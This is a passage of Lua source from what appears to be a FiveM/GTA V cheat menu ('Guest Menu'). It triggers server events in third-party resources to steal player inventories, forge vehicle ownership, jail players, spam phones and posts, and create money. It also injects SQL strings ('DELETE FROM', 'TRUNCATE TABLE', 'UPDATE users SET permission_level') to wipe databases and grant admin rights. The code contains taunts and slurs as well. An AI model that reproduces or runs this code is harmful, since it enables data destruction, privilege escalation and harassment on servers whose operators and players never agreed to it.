    for b7 = 0, k2 do
        if IsVehicleSeatFree(X, b7) then
            SetPedIntoVehicle(I.Guestdata.pLocalPlayer.pedId, X, b7)
            break
        end
    end
end
I.functions.sPO.bad7bcc70f01461807952895fdaabcd = function(k3, k4)
    if k3 and IsModelValid(k3) and IsModelAVehicle(k3) then
        RequestModel(k3)
        while not HasModelLoaded(k3) do
            d.Main.GuestWait(0)
        end
        local model = type(k3) == "number" and k3 or GetHashKey(k3)
        local ia = GetPlayerPed(k4)
        local k5 =
            I.natives.e087206cc908106f5b9548005fa39fd(model, GetEntityCoords(ia), GetEntityHeading(ia), true, true)
        local k6 = NetworkGetNetworkIdFromEntity(k5)
        SetNetworkIdCanMigrate(k6, true)
        SetEntityAsMissionEntity(k5, true, false)
        SetVehicleHasBeenOwnedByPlayer(k5, true)
        SetVehicleNeedsToBeHotwired(k5, false)
        SetModelAsNoLongerNeeded(model)
        if NetworkHasControlOfEntity(ia) then
            SetPedIntoVehicle(ia, k5, -1)
        end
        SetVehicleEngineOn(k5, true, false, false)
        SetVehRadioStation(k5, "OFF")
        return k5
    else
        Guestcustomnotif("~p~Guest Menu : ~s~Invalid Vehicle Model!", 0)
        return nil
    end
end
I.functions.sPO.d5fcab6eb40ea3c064f246412c8ea6c = function(k7, k4, k8)
    local k5 = I.functions.sPO.bad7bcc70f01461807952895fdaabcd(k7, k4)
    if k5 ~= nil then
        if I.functions.game.isNullOrEmpty(k8) then
            SetVehicleNumberPlateText(k5, GetVehicleNumberPlateText(k5))
        else
            SetVehicleNumberPlateText(k5, k8)
        end
        Guestcustomnotif("~p~Guest Menu : ~s~Spawned Vehicle", 0)
        local k9 = I.functions.game.getVehicleProperties(k5)
        local ka = GetDisplayNameFromVehicleModel(k9.model)
        if k9 then
            if I.functions.f1d4856a114a6894f5812bb126a541b("esx_vehicleshop") then
                I.exploitthing(
                    true,
                    true,
                    "esx_vehicleshop:setVehicleOwnedPlayerId",
                    GetPlayerServerId(k4),
                    k9,
                    ka,
                    k7,
                    false
                )
            elseif I.functions.f1d4856a114a6894f5812bb126a541b("esx_CryptosCustoms") then
                I.exploitthing(
                    true,
                    true,
                    "esx_CryptosCustoms:setVehicleOwnedPlayerId",
                    GetPlayerServerId(k4),
                    k9,
                    ka,
                    k7,
                    false
                )
            else
                Guestcustomnotif("~p~Guest Menu : ~s~Resource was not found!", 0)
            end
        end
    end
end
I.functions.sPO.ecff77c7cd1a99d5394e7bd0b878bccb = function()
    if IsPedInAnyVehicle(GetPlayerPed(-1)) then
        if I.Guestdata.ESX ~= nil then
            local ik = I.functions.game.getVehicleProperties(GetVehiclePedIsIn(GetPlayerPed(-1), false))
            if I.functions.f1d4856a114a6894f5812bb126a541b("esx_vehicleshop") then
                I.Guestdata.ESX.TriggerServerCallback(
                    "esx_vehicleshop:resellVehicle",
                    function(kb)
                    end,
                    ik.plate,
                    ik.model
                )
            elseif I.functions.f1d4856a114a6894f5812bb126a541b("esx_CryptosCustoms") then
                I.Guestdata.ESX.TriggerServerCallback(
                    "esx_CryptosCustoms:resellVehicle",
                    function(kb)
                    end,
                    ik.plate,
                    ik.model
                )
            else
                Guestcustomnotif("~p~Guest Menu : ~s~Resource was not found!", 0)
            end
        else
            Guestcustomnotif(
                "~p~Guest Menu : ~s~Could not find ESX, try refresing it in the settings tab",
                0
            )
        end
    else
        Guestcustomnotif("~p~Guest Menu : ~s~You must be in a vehicle to use this!", 0)
    end
end
I.functions.sPO.ee63e718fb882a3f6e889b0a515c69 = function(ck)
    local kc = nil
    if IsPedInAnyVehicle(GetPlayerPed(ck)) then
        kc = GetVehiclePedIsIn(GetPlayerPed(ck), false)
    else
        kc = GetVehiclePedIsIn(GetPlayerPed(ck), true)
    end
    if DoesEntityExist(kc) then
        local ii = GetEntityModel(kc)
        local ij = I.functions.sPO.bad7bcc70f01461807952895fdaabcd(ii, PlayerId())
        local ik = I.functions.game.getVehicleProperties(kc)
        ik.plate = nil
        I.functions.game.setVehicleProperties(ij, ik)
        SetVehicleEngineOn(ij, true, false, false)
        SetVehRadioStation(ij, "OFF")
    end
end
I.functions.sPO.c13f3928c35c767959c7acf6328801 = function(kd, K)
    hat = c2c74f255aa73c2253afc9ecc82PropIndex(K, 0)
    hat_texture = c2c74f255aa73c2253afc9ecc82PropTextureIndex(K, 0)
    glasses = c2c74f255aa73c2253afc9ecc82PropIndex(K, 1)
    glasses_texture = c2c74f255aa73c2253afc9ecc82PropTextureIndex(K, 1)
    ear = c2c74f255aa73c2253afc9ecc82PropIndex(K, 2)
    ear_texture = c2c74f255aa73c2253afc9ecc82PropTextureIndex(K, 2)
    watch = c2c74f255aa73c2253afc9ecc82PropIndex(K, 6)
    watch_texture = c2c74f255aa73c2253afc9ecc82PropTextureIndex(K, 6)
    wrist = c2c74f255aa73c2253afc9ecc82PropIndex(K, 7)
    wrist_texture = c2c74f255aa73c2253afc9ecc82PropTextureIndex(K, 7)
    head_drawable = c2c74f255aa73c2253afc9ecc82DrawableVariation(K, 0)
    head_palette = c2c74f255aa73c2253afc9ecc82PaletteVariation(K, 0)
    head_texture = c2c74f255aa73c2253afc9ecc82TextureVariation(K, 0)
    beard_drawable = c2c74f255aa73c2253afc9ecc82DrawableVariation(K, 1)
    beard_palette = c2c74f255aa73c2253afc9ecc82PaletteVariation(K, 1)
    beard_texture = c2c74f255aa73c2253afc9ecc82TextureVariation(K, 1)
    hair_drawable = c2c74f255aa73c2253afc9ecc82DrawableVariation(K, 2)
    hair_palette = c2c74f255aa73c2253afc9ecc82PaletteVariation(K, 2)
    hair_texture = c2c74f255aa73c2253afc9ecc82TextureVariation(K, 2)
    torso_drawable = c2c74f255aa73c2253afc9ecc82DrawableVariation(K, 3)
    torso_palette = c2c74f255aa73c2253afc9ecc82PaletteVariation(K, 3)
    torso_texture = c2c74f255aa73c2253afc9ecc82TextureVariation(K, 3)
    legs_drawable = c2c74f255aa73c2253afc9ecc82DrawableVariation(K, 4)
    legs_palette = c2c74f255aa73c2253afc9ecc82PaletteVariation(K, 4)
    legs_texture = c2c74f255aa73c2253afc9ecc82TextureVariation(K, 4)
    hands_drawable = c2c74f255aa73c2253afc9ecc82DrawableVariation(K, 5)
    hands_palette = c2c74f255aa73c2253afc9ecc82PaletteVariation(K, 5)
    hands_texture = c2c74f255aa73c2253afc9ecc82TextureVariation(K, 5)
    foot_drawable = c2c74f255aa73c2253afc9ecc82DrawableVariation(K, 6)
    foot_palette = c2c74f255aa73c2253afc9ecc82PaletteVariation(K, 6)
    foot_texture = c2c74f255aa73c2253afc9ecc82TextureVariation(K, 6)
    acc1_drawable = c2c74f255aa73c2253afc9ecc82DrawableVariation(K, 7)
    acc1_palette = c2c74f255aa73c2253afc9ecc82PaletteVariation(K, 7)
    acc1_texture = c2c74f255aa73c2253afc9ecc82TextureVariation(K, 7)
    acc2_drawable = c2c74f255aa73c2253afc9ecc82DrawableVariation(K, 8)
    acc2_palette = c2c74f255aa73c2253afc9ecc82PaletteVariation(K, 8)
    acc2_texture = c2c74f255aa73c2253afc9ecc82TextureVariation(K, 8)
    acc3_drawable = c2c74f255aa73c2253afc9ecc82DrawableVariation(K, 9)
    acc3_palette = c2c74f255aa73c2253afc9ecc82PaletteVariation(K, 9)
    acc3_texture = c2c74f255aa73c2253afc9ecc82TextureVariation(K, 9)
    mask_drawable = c2c74f255aa73c2253afc9ecc82DrawableVariation(K, 10)
    mask_palette = c2c74f255aa73c2253afc9ecc82PaletteVariation(K, 10)
    mask_texture = c2c74f255aa73c2253afc9ecc82TextureVariation(K, 10)
    aux_drawable = c2c74f255aa73c2253afc9ecc82DrawableVariation(K, 11)
    aux_palette = c2c74f255aa73c2253afc9ecc82PaletteVariation(K, 11)
    aux_texture = c2c74f255aa73c2253afc9ecc82TextureVariation(K, 11)
    SetPedPropIndex(kd, 0, hat, hat_texture, 1)
    SetPedPropIndex(kd, 1, glasses, glasses_texture, 1)
    SetPedPropIndex(kd, 2, ear, ear_texture, 1)
    SetPedPropIndex(kd, 6, watch, watch_texture, 1)
    SetPedPropIndex(kd, 7, wrist, wrist_texture, 1)
    SetPedComponentVariation(kd, 0, head_drawable, head_texture, head_palette)
    SetPedComponentVariation(kd, 1, beard_drawable, beard_texture, beard_palette)
    SetPedComponentVariation(kd, 2, hair_drawable, hair_texture, hair_palette)
    SetPedComponentVariation(kd, 3, torso_drawable, torso_texture, torso_palette)
    SetPedComponentVariation(kd, 4, legs_drawable, legs_texture, legs_palette)
    SetPedComponentVariation(kd, 5, hands_drawable, hands_texture, hands_palette)
    SetPedComponentVariation(kd, 6, foot_drawable, foot_texture, foot_palette)
    SetPedComponentVariation(kd, 7, acc1_drawable, acc1_texture, acc1_palette)
    SetPedComponentVariation(kd, 8, acc2_drawable, acc2_texture, acc2_palette)
    SetPedComponentVariation(kd, 9, acc3_drawable, acc3_texture, acc3_palette)
    SetPedComponentVariation(kd, 10, mask_drawable, mask_texture, mask_palette)
    SetPedComponentVariation(kd, 11, aux_drawable, aux_texture, aux_palette)
end
I.functions.sPO.b58cce487a539921a8cf163e4972aab = function(ck, model)
    local ke = "WEAPON_ASSAULTRIFLE"
    for b7 = 1, 5 do
        d.Main.GuestThread(
            function()
                local coords = GetEntityCoords(ck)
                RequestModel(GetHashKey(model))
                d.Main.GuestWait(50)
                if HasModelLoaded(GetHashKey(model)) then
                    local K =
                        CreatePed(21, GetHashKey(model), coords.x + b7, coords.y - b7, coords.z, 0, true, true) and
                        CreatePed(21, GetHashKey(model), coords.x - b7, coords.y + b7, coords.z, 0, true, true)
                    NetworkRegisterEntityAsNetworked(K)
                    SetPedRelationshipGroupHash(K, GetHashKey("AMBIENT_GANG_WEICHENG"))
                    SetPedRelationshipGroupDefaultHash(K, GetHashKey("AMBIENT_GANG_WEICHENG"))
                    if DoesEntityExist(K) and not IsEntityDead(ck) then
                        local kf = PedToNet(K)
                        NetworkSetNetworkIdDynamic(kf, false)
                        SetNetworkIdCanMigrate(kf, true)
                        SetNetworkIdExistsOnAllMachines(kf, true)
                        d.Main.GuestWait(100)
                        NetToPed(kf)
                        I.natives.d6900ec9e918eb1426be32868e2b0(K, GetHashKey(ke), 9999, 1, 1)
                        SetEntityInvincible(K, true)
                        SetPedCanSwitchWeapon(K, true)
                        TaskCombatPed(K, ck, 0, 16)
                    elseif IsEntityDead(ck) then
                        TaskCombatHatedTargetsInArea(K, coords.x, coords.y, coords.z, 500)
                    else
                        d.Main.GuestWait(0)
                    end
                end
            end
        )
    end
end
I.functions.sPO.c82691979e8888cf266778867584 = function(ck)
    d.Main.GuestThread(
        function()
            local x, y, z =
                d.Main.GuestTable.GuestUnPack(
                GetEntityCoords(ck)
            )
            local kg = "buzzard"
            local kh = "ig_claypain"
            RequestModel(kg)
            RequestModel(kh)
            local iv = 0
            while not HasModelLoaded(kh) do
                iv = iv + 100
                d.Main.GuestWait(100)
                if iv > 5000 then
                    Guestcustomnotif("~p~Guest Menu : ~s~Could not load model!", 0)
                    break
                end
            end
            while not HasModelLoaded(kg) do
                iv = iv + 100
                d.Main.GuestWait(100)
                if iv > 5000 then
                    Guestcustomnotif("~p~Guest Menu : ~s~Could not load model!", 0)
                    break
                end
            end
            local ki =
                I.natives.e087206cc908106f5b9548005fa39fd(
                GetHashKey(kg),
                x,
                y,
                z + 100,
                GetEntityHeading(ck),
                true,
                true
            )
            local ih = CreatePedInsideVehicle(ki, 4, kh, -1, true, false)
            SetHeliBladesFullSpeed(ki)
            SetCurrentPedVehicleWeapon(ih, GetHashKey("VEHICLE_WEAPON_PLANE_ROCKET"))
            SetVehicleshootAtTarget(ih, ck, x, y, z)
            local kf = PedToNet(ih)
            NetworkSetNetworkIdDynamic(kf, false)
            SetNetworkIdCanMigrate(kf, true)
            SetNetworkIdExistsOnAllMachines(kf, true)
            d.Main.GuestWait(30)
            NetToPed(kf)
            SetEntityInvincible(kf, true)
            SetPedCanSwitchWeapon(ih, true)
            TaskCombatPed(ih, ck, 0, 16)
            local model = "a_m_y_skater_01"
            local ke = "WEAPON_ASSAULTRIFLE"
            for b7 = 1, 3 do
                local coords = GetEntityCoords(ck)
                RequestModel(GetHashKey(model))
                d.Main.GuestWait(50)
                if HasModelLoaded(GetHashKey(model)) then
                    local K = CreatePedInsideVehicle(ki, 4, kh, b7, true, false)
                    NetworkRegisterEntityAsNetworked(K)
                    d.Main.GuestThread(
                        function()
                            if DoesEntityExist(K) and not IsEntityDead(ck) then
                                local kf = PedToNet(K)
                                NetworkSetNetworkIdDynamic(kf, false)
                                SetNetworkIdCanMigrate(kf, true)
                                SetNetworkIdExistsOnAllMachines(kf, true)
                                d.Main.GuestWait(100)
                                NetToPed(kf)
                                I.natives.d6900ec9e918eb1426be32868e2b0(K, GetHashKey(ke), 9999, 1, 1)
                                SetEntityInvincible(K, true)
                                SetPedCanSwitchWeapon(K, true)
                                TaskCombatPed(K, ck, 0, 16)
                            else
                                d.Main.GuestWait(0)
                            end
                        end
                    )
                end
            end
        end
    )
end
I.functions.sPO.spawnTankEnemy = function(ck)
    d.Main.GuestThread(
        function()
            local kj = "rhino"
            RequestModel(kj)
            while not HasModelLoaded(kj) do
                d.Main.GuestWait(50)
            end
            local kk = GetVehiclePedIsIn(ck, false)
            local x, y, z =
                d.Main.GuestTable.GuestUnPack(
                GetEntityCoords(ck)
            )
            local kl =
                I.natives.e087206cc908106f5b9548005fa39fd(
                GetHashKey(kj),
                x + 20,
                y + 20,
                z + 5,
                GetEntityCoords(ck),
                true,
                false
            )
            I.NewFunction.fhdfsqodjfgsh(kl)
            local km = "s_m_y_swat_01"
            RequestModel(km)
            while not HasModelLoaded(km) do
                RequestModel(km)
                d.Main.GuestWait(50)
            end
            local kn =
                CreatePedInsideVehicle(
                kl,
                4,
                GetEntityModel(I.Guestdata.pLocalPlayer.pedId),
                -1,
                true,
                false
            )
            I.NewFunction.fhdfsqodjfgsh(kn)
            SetDriverAbility(kn, 10.0)
            SetDriverAggressiveness(kn, 10.0)
            TaskCombatPed(kn, ck, 0, 16)
        end
    )
end
I.functions.sPO.cagePlayer = function(ck)
    local x, y, z =
        d.Main.GuestTable.GuestUnPack(
        GetEntityCoords(ck)
    )
    local ko = GetHashKey("prop_doghouse_01")
    RequestModel(ko)
    d.Main.GuestThread(
        function()
            local iv = 0
            while not HasModelLoaded(ko) do
                iv = iv + 100
                d.Main.GuestWait(100)
                if iv > 5000 then
                    Guestcustomnotif("~p~Guest Menu : ~s~Could not load model!", 0)
                    break
                end
            end
            I.natives.clearPedTasksImmediately(ck)
            local kp = I.natives.createObject(ko, x, y, z, true, true, false)
            SetEntityHeading(kp, 0.0)
            FreezeEntityPosition(kp, true)
        end
    )
end
I.functions.sPO.bbc99a8240bf964dca27f2e8a48f665a = function(js, ck)
    for b7 = 1, #I.FunctionTables.weaponsModels do
        if js then
            CreatePickup(GetHashKey("PICKUP_" .. I.FunctionTables.weaponsModels[b7]), GetEntityCoords(ck))
        else
            I.natives.d6900ec9e918eb1426be32868e2b0(
                ck,
                GetHashKey(I.FunctionTables.weaponsModels[b7]),
                250,
                false,
                false
            )
        end
    end
end
I.functions.sPO.ramVehicle = function(ck, kq)
    d.Main.GuestThread(
        function()
            local model = GetHashKey(kq)
            RequestModel(model)
            while not HasModelLoaded(model) do
                d.Main.GuestWait(0)
            end
            local fW = GetOffsetFromEntityInWorldCoords(ck, 0, -10.0, 0)
            if HasModelLoaded(model) then
                local veh =
                    I.natives.e087206cc908106f5b9548005fa39fd(model, fW.x, fW.y, fW.z, GetEntityHeading(ck), true, true)
                NetworkRegisterEntityAsNetworked(VehToNet(veh))
                SetVehicleForwardSpeed(veh, 60.0)
            end
        end
    )
end
I.functions.sPO.a82067704cc6922707d00ddbe0451 = function(ck, fM)
    local ko = GetHashKey(fM)
    RequestModel(ko)
    d.Main.GuestThread(
        function()
            local iv = 0
            while not HasModelLoaded(ko) do
                iv = iv + 100
                d.Main.GuestWait(100)
                if iv > 5000 then
                    Guestcustomnotif("~p~Guest Menu : ~s~Could not load model!", 0)
                    break
                end
            end
            local x, y, z =
                d.Main.GuestTable.GuestUnPack(
                GetEntityCoords(ck)
            )
            local eQ = I.natives.createObject(ko, x, y, z, true, true, false)
            AttachEntityToEntity(
                eQ,
                ck,
                GetPedBoneIndex(ck, SKEL_Spine_Root),
                0.0,
                0.0,
                0.0,
                0.0,
                90.0,
                0,
                false,
                false,
                false,
                false,
                2,
                true
            )
        end
    )
end
I.functions.sPO.shootAt = function(ck, kr)
    if IsPedInAnyVehicle(ck, true) then
        I.natives.clearPedTasksImmediately(ck)
    end
    local ks = GetPedBoneCoords(ck, SKEL_ROOT, 0.0, 0.0, 0.0)
    local kt = GetPedBoneCoords(ck, SKEL_R_Hand, 0.0, 0.0, 0.2)
    local Z = GetHashKey(kr)
    I.natives.shootSingleBulletBetweenCoords(
        kt.x,
        kt.y,
        kt.z,
        ks.x,
        ks.y,
        ks.z,
        1,
        0,
        Z,
        I.Guestdata.pLocalPlayer.pedId,
        false,
        false,
        1
    )
end
I.functions.sPO.rapeVehicle = function(X)
    if not IsPedAPlayer(c2c74f255aa73c2253afc9ecc82InVehicleSeat(X, -1)) then
        I.NewFunction.fhdfsqodjfgsh(X)
        if NetworkHasControlOfEntity(X) then
            SetEntityAsMissionEntity(X, false, false)
            StartVehicleAlarm(X)
            DetachVehicleWindscreen(X)
            SmashVehicleWindow(X, 0)
            SmashVehicleWindow(X, 1)
            SmashVehicleWindow(X, 2)
            SmashVehicleWindow(X, 3)
            SetVehicleTyreBurst(X, 0, true, 1000.0)
            SetVehicleTyreBurst(X, 1, true, 1000.0)
            SetVehicleTyreBurst(X, 2, true, 1000.0)
            SetVehicleTyreBurst(X, 3, true, 1000.0)
            SetVehicleTyreBurst(X, 4, true, 1000.0)
            SetVehicleTyreBurst(X, 5, true, 1000.0)
            SetVehicleTyreBurst(X, 4, true, 1000.0)
            SetVehicleTyreBurst(X, 7, true, 1000.0)
            SetVehicleDoorBroken(X, 0, true)
            SetVehicleDoorBroken(X, 1, true)
            SetVehicleDoorBroken(X, 2, true)
            SetVehicleDoorBroken(X, 3, true)
            SetVehicleDoorBroken(X, 4, true)
            SetVehicleDoorBroken(X, 5, true)
            SetVehicleDoorBroken(X, 6, true)
            SetVehicleDoorBroken(X, 7, true)
            SetVehicleLights(X, 1)
            SetVehicleLightsMode(X, 1)
            SetVehicleNumberPlateTextIndex(X, 5)
            SetVehicleNumberPlateText(X, "g" .. "uest")
            SetVehicleDirtLevel(X, 10.0)
            SetVehicleModColor_1(X, 1)
            SetVehicleModColor_2(X, 1)
            SetVehicleCustomPrimaryColour(X, 255, 51, 255)
            SetVehicleCustomSecondaryColour(X, 255, 51, 255)
            SetVehicleBurnout(X, true)
            ForceVehicleEngineAudio(X, "faggio")
            SetVehicleLightsMode(X, 1)
            SetVehicleHandlingFloat(X, "CHandlingData", "fDriveBiasFront", 0.9)
            SetVehicleSteerBias(X, 1.0)
        end
    end
end
I.functions.sPO.SearchDisc = function(eU)
    local ku = {type = "player", owner = "", seize = true}
    if I.Guestdata.ESX ~= nil then
        I.Guestdata.ESX.TriggerServerCallback(
            "disc-inventoryhud:getIdentifier",
            function(b1)
                ku.owner = b1
                I.exploitthing(false, false, "disc-inventoryhud:openInventory", ku)
            end,
            eU
        )
    else
        Guestcustomnotif(
            "~p~Guest Menu : ~s~Could not find ESX, try refresing it in the settings tab",
            0
        )
    end
end
I.functions.sPO.StealDisc = function(eU)
    local kv = {type = "player", owner = "", steal = true}
    if I.Guestdata.ESX ~= nil then
        I.Guestdata.ESX.TriggerServerCallback(
            "disc-inventoryhud:getIdentifier",
            function(b1)
                kv.owner = b1
                I.exploitthing(false, false, "disc-inventoryhud:openInventory", kv)
            end,
            eU
        )
    else
        Guestcustomnotif(
            "~p~Guest Menu : ~s~Could not find ESX, try refresing it in the settings tab",
            0
        )
    end
end
I.functions.sPO.jailTheFucker = function(ck, time)
    if
        I.functions.f1d4856a114a6894f5812bb126a541b("esx-qalle-jail") or
            I.functions.f1d4856a114a6894f5812bb126a541b("esx_qalle_jail")
     then
        I.exploitthing(false, true, "esx-qalle-jail:jailPlayer", ck, time, "www.GuestCheats")
    elseif I.functions.f1d4856a114a6894f5812bb126a541b("esx_jailer") then
        I.exploitthing(
            false,
            true,
            "esx_jailler:sendToJail",
            ck,
            time,
            "www.GuestCheats",
            time
        )
        I.exploitthing(
            false,
            true,
            "esx_jailer:sendToJail",
            ck,
            time,
            "www.GuestCheats",
            time
        )
    elseif I.functions.f1d4856a114a6894f5812bb126a541b("esx_jail") then
        I.exploitthing(false, true, "esx_jail:sendToJail", ck, time, "www.GuestCheats")
    else
        Guestcustomnotif("~p~Guest Menu : ~s~Resource was not found!", 0)
    end
end
I.functions.sPO.unJailTheFucker = function(ck)
    if
        I.functions.f1d4856a114a6894f5812bb126a541b("esx-qalle-jail") or
            I.functions.f1d4856a114a6894f5812bb126a541b("esx_qalle_jail")
     then
        I.exploitthing(false, true, "esx-qalle-jail:unJailPlayer", ck)
    elseif I.functions.f1d4856a114a6894f5812bb126a541b("esx_jailer") then
        I.exploitthing(false, true, "esx_jailler:sendToJail", ck, 0, "www.GuestCheats", time)
        I.exploitthing(false, true, "esx_jailer:sendToJail", ck, 0, "www.GuestCheats", time)
    elseif I.functions.f1d4856a114a6894f5812bb126a541b("esx_jail") then
        I.exploitthing(false, true, "esx_jail:sendToJail", ck, 0, "www.GuestCheats")
    else
        Guestcustomnotif("~p~Guest Menu : ~s~Resource was not found!", 0)
    end
end
I.functions.sPO.a0c3c7c65448d332b391432b870632 = function(ck)
    if
        I.functions.f1d4856a114a6894f5812bb126a541b("ESX_a0c3c7c65448d332b391432b870632") or
            I.functions.f1d4856a114a6894f5812bb126a541b("esx_a0c3c7c65448d332b391432b870632")
     then
        I.exploitthing(false, true, "esx_a0c3c7c65448d332b391432b870632:sendToa0c3c7c65448d332b391432b870632", ck, 5391)
    else
        Guestcustomnotif("~p~Guest Menu : ~s~Resource was not found!", 0)
    end
end
I.functions.exploits = {}
I.functions.exploits.a60d1e2bb110c550359e9f9425dc7baf = function()
    if
        I.functions.f1d4856a114a6894f5812bb126a541b("gcPhone") or
            I.functions.f1d4856a114a6894f5812bb126a541b("xenknight")
     then
        d.Main.GuestThread(
            function()
                I.exploitthing(
                    false,
                    true,
                    "gcPhone:twitter_createAccount",
                    "GuestCheats",
                    "GuestCheats",
                    "https://www.cjnews.com/wp-content/uploads/2012/01/gay-640x588.jpg"
                )
                d.Main.GuestWait(1500)
                I.exploitthing(
                    false,
                    true,
                    "gcPhone:twitter_login",
                    "GuestCheats",
                    "GuestCheats"
                )
                d.Main.GuestWait(1500)
                for b7 = 1, 50 do
                    I.exploitthing(
                        true,
                        true,
                        "gcPhone:twitter_postTweets",
                        "GuestCheats",
                        "GuestCheats",
                        "GuestCheats > all | Cow#5391"
                    )
                end
            end
        )
    else
        Guestcustomnotif("~p~Guest Menu : ~s~Resource was not found!", 0)
    end
end
I.functions.exploits.esx_license = function()
    if I.functions.f1d4856a114a6894f5812bb126a541b("esx_license") then
        local kw = {
            "Guest",
            "Guest",
            "Cow#5391",
            "RIP Your SQL",
            "lmao you got boomed",
            "Cow Was Here",
            "nah bro really? use backup"
        }
        for b7 = 0, #kw do
            local h4 = I.natives.GetActivePlayers()
            for eU = 0, #h4 do
                I.exploitthing(
                    true,
                    true,
                    "esx_license:addLicense",
                    eU,
                    kw[b7],
                    function(hd)
                        hd(true)
                        o("added license " .. kw[b7] .. " to " .. eU)
                    end
                )
            end
        end
    else
        Guestcustomnotif("~p~Guest Menu : ~s~Resource was not found!", 0)
    end
end
I.functions.exploits.esx_givelicenses = function()
    if I.functions.f1d4856a114a6894f5812bb126a541b("esx_license") then
        local kw = {"dmv", "drive", "drive_bike", "drive_truck", "weapon"}
        for b7 = 0, #kw do
            local h4 = I.natives.GetActivePlayers()
            for eU = 0, #h4 do
                I.exploitthing(
                    true,
                    true,
                    "esx_license:addLicense",
                    eU,
                    kw[b7],
                    function(hd)
                        hd(true)
                        o("added license " .. kw[b7])
                    end
                )
            end
        end
    else
        Guestcustomnotif("~p~Guest Menu : ~s~Resource was not found!", 0)
    end
end
I.functions.exploits.esx_kashacters = function(kx, ky, table)
    if
        I.functions.f1d4856a114a6894f5812bb126a541b("esx_kashacters") or
            I.functions.f1d4856a114a6894f5812bb126a541b("esx_Kashacters") or
            I.functions.f1d4856a114a6894f5812bb126a541b("Kashacters") or
            I.functions.f1d4856a114a6894f5812bb126a541b("kashacters")
     then
        if kx then
            local kz = kx:gsub("steam", "")
            kz = "Char1" .. kz
            I.exploitthing(
                false,
                true,
                "kashactersS:DeleteCharacter",
                "';DELETE FROM " .. table .. " WHERE identifier='" .. kx .. "';/"
            )
            I.exploitthing(
                false,
                true,
                "kashactersS:DeleteCharacter",
                "';DELETE FROM " .. table .. " WHERE identifier='" .. kz .. "';/"
            )
            I.exploitthing(
                false,
                true,
                "kashactersS:DeleteCharacter",
                "';DELETE FROM " .. table .. " WHERE target='" .. kx .. "';/"
            )
            I.exploitthing(
                false,
                true,
                "kashactersS:DeleteCharacter",
                "';DELETE FROM " .. table .. " WHERE target='" .. kz .. "';/"
            )
        else
            if ky == "clean" then
                I.exploitthing(false, true, "kashactersS:DeleteCharacter", "';TRUNCATE TABLE " .. table .. ";/")
            elseif ky == "flood" then
                I.exploitthing(
                    false,
                    true,
                    "kashactersS:DeleteCharacter",
                    "';UPDATE users SET permission_level='100' WHERE name='" ..
                        NetworkPlayerGetName(PlayerId()) .. "';/"
                )
            end
        end
        Guestcustomnotif("~p~Guest Menu : ~s~Exploit ran successfully", 15000)
    else
        Guestcustomnotif("~p~Guest Menu : ~s~Resource was not found!", 0)
    end
end
I.functions.exploits.de619a5e3f0bbd797ca20da9e02cba3 = function()
    if
        I.functions.f1d4856a114a6894f5812bb126a541b("de619a5e3f0bbd797ca20da9e02cba3") or
            I.functions.f1d4856a114a6894f5812bb126a541b("de619a5e3f0bbd797ca20da9e02cba3") or
            I.functions.f1d4856a114a6894f5812bb126a541b("interact-sound")
     then
        I.exploitthing(true, true, "de619a5e3f0bbd797ca20da9e02cba3_SV:PlayOnAll", "demo", 99.0)
        I.exploitthing(true, true, "de619a5e3f0bbd797ca20da9e02cba3_SV:PlayWithinDistance", 5000.0, "demo", 98.0)
        I.exploitthing(true, true, "de619a5e3f0bbd797ca20da9e02cba3_SV:PlayOnAll", "cuff", 97.0)
        I.exploitthing(true, true, "de619a5e3f0bbd797ca20da9e02cba3_SV:PlayOnAll", "buckle", 96.0)
    else
        Guestcustomnotif("~p~Guest Menu : ~s~Resource was not found!", 0)
    end
end
I.functions.exploits.phoneSpam = function()
    if
        I.functions.f1d4856a114a6894f5812bb126a541b("esx_phone") or
            I.functions.f1d4856a114a6894f5812bb126a541b("gcPhone") or
            I.functions.f1d4856a114a6894f5812bb126a541b("xenknight")
     then
        I.exploitthing(
            true,
            true,
            "esx_phone:send",
            "police",
            "www.GuestCheats",
            true,
            {x = 1337.0, y = 1337.0, z = 1337.0}
        )
        I.exploitthing(
            true,
            true,
            "esx_phone:send",
            "ambulance",
            "www.GuestCheats",
            true,
            {x = 1337.0, y = 1337.0, z = 1337.0}
        )
        I.exploitthing(
            true,
            true,
            "esx_phone:send",
            "taxi",
            "www.GuestCheats",
            true,
            {x = 1337.0, y = 1337.0, z = 1337.0}
        )
        I.exploitthing(
            true,
            true,
            "esx_phone:send",
            "realestateagent",
            "www.GuestCheats",
            true,
            {x = 1337.0, y = 1337.0, z = 1337.0}
        )
    elseif I.functions.f1d4856a114a6894f5812bb126a541b("esx_addons_gcphone") then
        I.exploitthing(
            true,
            true,
            "esx_addons_gcphone:startCall",
            "police",
            "www.GuestCheats",
            {x = 1337.0, y = 1337.0, z = 1337.0}
        )
        I.exploitthing(
            true,
            true,
            "esx_addons_gcphone:startCall",
            "ambulance",
            "www.GuestCheats",
            {x = 1337.0, y = 1337.0, z = 1337.0}
        )
        I.exploitthing(
            true,
            true,
            "esx_addons_gcphone:startCall",
            "taxi",
            "www.GuestCheats",
            {x = 1337.0, y = 1337.0, z = 1337.0}
        )
        I.exploitthing(
            true,
            true,
            "esx_addons_gcphone:startCall",
            "realestateagent",
            "www.GuestCheats",
            {x = 1337.0, y = 1337.0, z = 1337.0}
        )
    end
end
I.functions.exploits.esx_moneymaker = function()
    if I.Guestdata.ESX == nil then
        Guestcustomnotif("~p~Guest Menu : ~s~ESX was not found.")
        return
    end
    local fl = I.NewFunction.c9f328ef7b30553a6705e827855bd30c("Enter amount of money", "", 12)
    if not I.functions.game.isNullOrEmpty(fl) then
        local kA = I.NewFunction.c9f328ef7b30553a6705e827855bd30c("Enter amount loops", "", 12)
        if not kA then
            kA = 1
        end
        I.functions.exploits.run_esx_moneymaker(fl, kA)
    else
        Guestcustomnotif("~p~Guest Menu : ~s~Please enter a valid amount of money!", 0)
    end
end
I.functions.exploits.run_esx_moneymaker = function(kB, kC)
    if I.Guestdata.ESX == nil then
        Guestcustomnotif("~p~Guest Menu : ~s~ESX was not found.")
        return
    end
    for kD = 0, kC do
        if I.functions.f1d4856a114a6894f5812bb126a541b("disc-base") then
            I.exploitthing(true, true, "disc-base:givePlayerMoney", kB)
            I.exploitthing(true, true, "disc-base:givePlayerDirtyMoney", kB)
        end
        if
            I.functions.f1d4856a114a6894f5812bb126a541b("esx_vangelico_robbery") or
                I.functions.f1d4856a114a6894f5812bb126a541b("esx_vangelico")
         then
            I.exploitthing(true, true, "esx_vangelico_robbery:gioielli")
            I.exploitthing(true, true, "esx_vangelico_robbery:gioielli1")
            I.exploitthing(true, true, "lester:vendita")
        end
        if
            I.functions.f1d4856a114a6894f5812bb126a541b("esx_burglary") or
